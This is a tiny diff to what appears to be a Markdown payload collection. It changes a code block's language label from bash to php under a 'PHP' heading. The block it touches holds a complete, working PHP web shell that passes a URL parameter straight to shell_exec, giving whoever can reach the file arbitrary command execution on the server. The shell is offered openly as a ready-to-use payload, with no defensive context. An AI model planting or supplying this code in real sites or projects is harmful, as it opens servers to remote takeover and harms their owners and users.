@@ -1,5 +1,5 @@
 # PHP
 
-```bash
+```php
 <?php echo shell_exec($_GET["cmd"]); ?>
 ```
